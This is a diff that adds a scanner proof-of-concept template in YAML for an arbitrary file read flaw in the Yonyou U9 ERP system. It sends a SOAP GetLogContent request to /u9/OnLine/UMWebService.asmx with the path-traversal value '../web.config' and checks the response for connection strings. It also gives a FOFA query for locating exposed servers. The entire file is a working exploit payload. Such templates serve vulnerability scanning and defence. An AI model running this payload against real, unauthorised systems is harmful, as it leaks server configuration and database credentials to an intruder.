@@ -1,0 +1,34 @@
+id: poc-yaml-yongyou-u9-umwebservice-asmx-anyfile-read
+info:
+  name: 用友U9 UMWebService.asmx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友U9
+  fofa: title=="        U9-登录    "
+requests:
+- method: POST
+  path: /u9/OnLine/UMWebService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetLogContent
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <GetLogContent xmlns="http://tempuri.org/">
+
+    <fileName>../web.config</fileName>
+
+    </GetLogContent>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 200 && contains(body,"configSections") && contains(body,"appSettings")
+    && contains(body,"connectionStrings") && contains(content_type,"text/xml")
+variables: {}
+transport: http
